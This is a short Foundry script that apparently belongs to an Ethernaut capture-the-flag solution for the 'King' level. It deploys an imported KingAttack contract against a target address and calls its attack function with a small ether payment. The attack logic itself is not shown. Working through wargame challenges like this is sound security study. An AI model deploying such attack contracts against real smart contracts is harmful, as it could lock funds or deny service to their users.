// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {KingAttack} from "../src/attacks/Level09King_Attack.sol";

contract KingScript is Script {
    function setUp() public {}

    function run() public {
        address instanceAddress = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast();

        KingAttack attacker = new KingAttack(instanceAddress);
        attacker.attack{value: 1000000 gwei}();

        vm.stopBroadcast();
    }
}
